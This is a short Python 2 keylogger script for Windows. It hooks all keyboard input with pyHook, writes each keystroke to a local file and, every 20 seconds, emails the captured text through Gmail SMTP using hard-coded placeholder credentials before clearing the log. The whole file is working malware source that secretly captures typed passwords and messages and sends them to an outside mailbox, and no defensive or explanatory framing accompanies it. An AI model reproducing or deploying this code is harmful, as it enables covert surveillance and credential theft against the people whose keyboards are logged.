import pyHook, pythoncom, sys, logging
import time, datetime
import smtplib

waitSeconds = 20
timeout = time.time() + waitSeconds
loggerFile = 'C:\\data.txt'

def TimeOut():
    if time.time() > timeout:
        return True
    else:
        return False

def SendEmail(user, pwd, recipient, subject, body):
    gmail_user = user
    gmail_password = pwd
    TO = recipient if type(recipient) is list else [recipient]
    SUBJECT = subject
    TEXT = body

    message = """\From: %s\nTo: %s\nSubject: %s\n\n%s
    """ % (gmail_user, ", ".join(TO), SUBJECT, TEXT)

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(gmail_user, gmail_password)
        server.sendmail(gmail_user, TO, message)
        server.close()
        print 'THE EMAIL HAS BEEN SENT.'
    except:
        print 'AN ERROR HAS OCCURRED.', sys.exc_info()[0]

def FormatAndSendLogEmail():
    with open(loggerFile, 'r+') as f:
        actualdate = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f.read().replace('\n', '')
        SendEmail('email@gmail.com', 'password', 'email@gmail.com', actualdate, data)
        f.seek(0)
        f.truncate()

def OnKeyboardEvent(event):
    logging.basicConfig(filename = loggerFile, level = logging.DEBUG, format = '%(message)s')
    logging.log(10, chr(event.Ascii))
    return True

hooksManager = pyHook.HookManager()
hooksManager.KeyDown = OnKeyboardEvent
hooksManager.HookKeyboard()

while True:
    if TimeOut():
        FormatAndSendLogEmail()
        timeout = time.time() + waitSeconds

    pythoncom.PumpWaitingMessages()

